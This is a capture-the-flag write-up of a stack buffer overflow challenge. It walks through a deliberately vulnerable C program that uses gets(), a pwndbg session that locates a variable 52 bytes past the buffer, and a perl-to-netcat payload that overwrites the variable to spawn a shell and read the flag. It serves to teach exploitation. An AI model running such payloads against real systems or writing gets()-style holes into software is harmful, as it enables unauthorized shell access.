# bof

a buffer overflow is a common exploit that involves
writing more data to a fixed-size array than it can hold.
the consequence is that data stored in adjacent memory to the array 
is overwritten/corrupted, which can alter the flow of the program.
this simple program demonstrates the concept:

```{.c .numberLines}
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                setregid(getegid(), getegid());
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```

`func()` takes the argument `0xdeadbeef` and opens a shell if
that value somehow changes to `0xcafebabe`. normally, arguments
passed to a function should be safe from outside modification.
however, the unsafe `gets()` is used here—`gets()`
reads from the standard input into a buffer until it reaches a 
newline or EOF, without checking for an input size. thus, any data
written past the buffer will clobber adjacent memory. we'll use gdb/pwndbg
to examine the disassembly of `func()` and see if `key` is in harm's way.

```markdown
$ gdb -q bof
pwndbg> b gets
Breakpoint 1 at 0x1060
pwndbg> r
Starting program: /home/bof/bof
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, _IO_gets (buf=0xffffd4fc "\204\326\377\377") at ./libio/iogets.c:32
32	./libio/iogets.c: No such file or directory.
Disabling the emulation via Unicorn Engine that is used for computing branches as there isn't enough memory (1GB) to use it (since mmap(1G, RWX) failed). See also:
* https://github.com/pwndbg/pwndbg/issues/1534
* https://github.com/unicorn-engine/unicorn/pull/1743
Either free your memory or explicitly set `set emulate off` in your Pwndbg config
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
──────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────
 EAX  0xffffd4fc —▸ 0xffffd684 ◂— 0x20 /* ' ' */
 EBX  0x56559000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3efc
 ECX  0x56557016 ◂— 0x69622f00
 EDX  0
 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0
 ESI  0xffffd614 —▸ 0xffffd75b ◂— '/home/bof/bof'
 EBP  0xffffd528 —▸ 0xffffd548 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 —▸ 0x56555000 ◂— ...
 ESP  0xffffd4dc —▸ 0x56556239 (func+60) ◂— add esp, 0x10
 EIP  0xf7def8f0 (gets) ◂— endbr32
───────────────────────────────────────[ DISASM / i386 / set emulate off ]────────────────────────────────────────
 ► 0xf7def8f0 <gets>       endbr32
   0xf7def8f4 <gets+4>     push   ebp
   0xf7def8f5 <gets+5>     mov    ebp, esp
   0xf7def8f7 <gets+7>     push   edi
   0xf7def8f8 <gets+8>     call   __x86.get_pc_thunk.di       <__x86.get_pc_thunk.di>

   0xf7def8fd <gets+13>    add    edi, 0x1b7703
   0xf7def903 <gets+19>    push   esi
   0xf7def904 <gets+20>    push   ebx
   0xf7def905 <gets+21>    sub    esp, 0x1c
   0xf7def908 <gets+24>    mov    ebx, dword ptr [edi - 0x70]
   0xf7def90e <gets+30>    mov    esi, dword ptr [ebx]
────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────
00:0000│ esp 0xffffd4dc —▸ 0x56556239 (func+60) ◂— add esp, 0x10
01:0004│-048 0xffffd4e0 —▸ 0xffffd4fc —▸ 0xffffd684 ◂— 0x20 /* ' ' */
02:0008│-044 0xffffd4e4 ◂— 0xffffffff
03:000c│-040 0xffffd4e8 —▸ 0x56555034 ◂— 6
04:0010│-03c 0xffffd4ec —▸ 0x5655620a (func+13) ◂— add ebx, 0x2df6
05:0014│-038 0xffffd4f0 —▸ 0xf7ffd608 (_rtld_global+1512) —▸ 0xf7fc6000 ◂— 0x464c457f
06:0018│-034 0xffffd4f4 ◂— 0x20 /* ' ' */
07:001c│-030 0xffffd4f8 ◂— 0
──────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────
 ► 0 0xf7def8f0 gets
   1 0x56556239 func+60
   2 0x565562c5 main+40
   3 0xf7d9e519 __libc_start_call_main+121
   4 0xf7d9e5f3 __libc_start_main+147
   5 0x565560fb _start+43
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/32xw $esp
0xffffd4dc:	0x56556239	0xffffd4fc	0xffffffff	0x56555034
0xffffd4ec:	0x5655620a	0xf7ffd608	0x00000020	0x00000000
0xffffd4fc:	0xffffd684	0x00000000	0x00000000	0x01000000
0xffffd50c:	0x0000000b	0xf7fc4540	0x00000000	0xf7d954be
0xffffd51c:	0x8bafe300	0xf7fa7000	0xffffd614	0xffffd548
0xffffd52c:	0x565562c5	0xdeadbeef	0xf7fbe66c	0xf7fbeb30
0xffffd53c:	0x565562b3	0x00000001	0xffffd560	0xf7ffd020
0xffffd54c:	0xf7d9e519	0xffffd75b	0x00000070	0xf7ffd000
```

I've set a breakpoint at the start of `gets()` and run the program to reach it at
`0xf7def8f0`. the command `x/32xw $esp` dumps 32 4-byte words starting at the address
held in the stack pointer register, which gives us a glimpse of the current stack frame.
at this point, we can see `0xdeadbeef` at address `0xffffd530`—this is `key`.

```markdown
pwndbg> fin
Run till exit from #0  _IO_gets (buf=0xffffd4fc "\204\326\377\377") at ./libio/iogets.c:32
overflow me : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x56556239 in func ()
Value returned is $1 = 0xffffd4fc 'A' <repeats 32 times>
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
──────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────
 EAX  0xffffd4fc ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
 EBX  0x56559000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3efc
*ECX  0xf7fa89c0 (_IO_stdfile_0_lock) ◂— 0
*EDX  1
 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0
 ESI  0xffffd614 —▸ 0xffffd75b ◂— '/home/bof/bof'
 EBP  0xffffd528 —▸ 0xffffd548 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 —▸ 0x56555000 ◂— ...
*ESP  0xffffd4e0 —▸ 0xffffd4fc ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
*EIP  0x56556239 (func+60) ◂— add esp, 0x10
───────────────────────────────────────[ DISASM / i386 / set emulate off ]────────────────────────────────────────
 ► 0x56556239 <func+60>    add    esp, 0x10                           ESP => 0xffffd4e0 + 0x10
   0x5655623c <func+63>    cmp    dword ptr [ebp + 8], 0xcafebabe
   0x56556243 <func+70>    jne    func+117                    <func+117>

   0x56556245 <func+72>    call   getegid@plt                 <getegid@plt>

   0x5655624a <func+77>    mov    esi, eax
   0x5655624c <func+79>    call   getegid@plt                 <getegid@plt>

   0x56556251 <func+84>    sub    esp, 8
   0x56556254 <func+87>    push   esi
   0x56556255 <func+88>    push   eax
   0x56556256 <func+89>    call   setregid@plt                <setregid@plt>

   0x5655625b <func+94>    add    esp, 0x10
────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────
00:0000│ esp 0xffffd4e0 —▸ 0xffffd4fc ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
01:0004│-044 0xffffd4e4 ◂— 0xffffffff
02:0008│-040 0xffffd4e8 —▸ 0x56555034 ◂— 6
03:000c│-03c 0xffffd4ec —▸ 0x5655620a (func+13) ◂— add ebx, 0x2df6
04:0010│-038 0xffffd4f0 —▸ 0xf7ffd608 (_rtld_global+1512) —▸ 0xf7fc6000 ◂— 0x464c457f
05:0014│-034 0xffffd4f4 ◂— 0x20 /* ' ' */
06:0018│-030 0xffffd4f8 ◂— 0
07:001c│ eax 0xffffd4fc ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
──────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────
 ► 0 0x56556239 func+60
   1 0x565562c5 main+40
   2 0xf7d9e519 __libc_start_call_main+121
   3 0xf7d9e5f3 __libc_start_main+147
   4 0x565560fb _start+43
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/32xw $esp
0xffffd4e0:	0xffffd4fc	0xffffffff	0x56555034	0x5655620a
0xffffd4f0:	0xf7ffd608	0x00000020	0x00000000	0x41414141
0xffffd500:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd510:	0x41414141	0x41414141	0x41414141	0x8bafe300
0xffffd520:	0xf7fa7000	0xffffd614	0xffffd548	0x565562c5
0xffffd530:	0xdeadbeef	0xf7fbe66c	0xf7fbeb30	0x565562b3
0xffffd540:	0x00000001	0xffffd560	0xf7ffd020	0xf7d9e519
0xffffd550:	0xffffd75b	0x00000070	0xf7ffd000	0xf7d9e519
```

there's a lot of noise from pwndbg, but all I've done here is execute the rest of `gets()`
with the `fin` command to read from standard input, then filled `overflowme` with 32 bytes.
this lets us see where the initialized data in the buffer is stored relative to `key`, which is
not very far away.

```markdown
pwndbg> x/32xw $esp
0xffffd4e0:	0xffffd4fc	0xffffffff	0x56555034	0x5655620a
0xffffd4f0:	0xf7ffd608	0x00000020	0x00000000	0x41414141
0xffffd500:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd510:	0x41414141	0x41414141	0x41414141	0xd0b49c00
0xffffd520:	0xf7fa7000	0xffffd614	0xffffd548	0x565562c5
0xffffd530:	0xdeadbeef	0xf7fbe66c	0xf7fbeb30	0x565562b3
0xffffd540:	0x00000001	0xffffd560	0xf7ffd020	0xf7d9e519
0xffffd550:	0xffffd75b	0x00000070	0xf7ffd000	0xf7d9e519
pwndbg> p 0xffffd530 - 0xffffd4fc
$1 = 52
```

we can see that `0xdeadbeef` is offset 52 bytes ahead of the data now in `overflowme` (0x414141...)
when it's filled to capacity. now let's smash the stack by overflowing the buffer and 
writing over `key` with `0xcafebabe`:

```markdown
$ cat readme
bof binary is running at "nc 0 9000" under bof_pwn privilege. get shell and read flag
$ (perl -e 'print "A"x52 . "\xbe\xba\xfe\xca"'; cat) | nc 0 9000

whoami
bof_pwn
cat flag
Daddy_I_just_pwned_a_buff3r!
```

the payload contains 52 filler bytes followed by `0xcafebabe` in little-endian order, and is piped to the
binary behind port 9000 on the localhost. finally, the trailing `cat` does two things: 
keeps the standard input stream open to enter a newline, terminating the `gets()` call, and also allows us to
interact with the shell. note that triggering the stack protector by writing over the canaries and return address
located between the local buffer and `key` would cause a crash if `func()` ever returned, but fortunately, the shell is opened
before then.
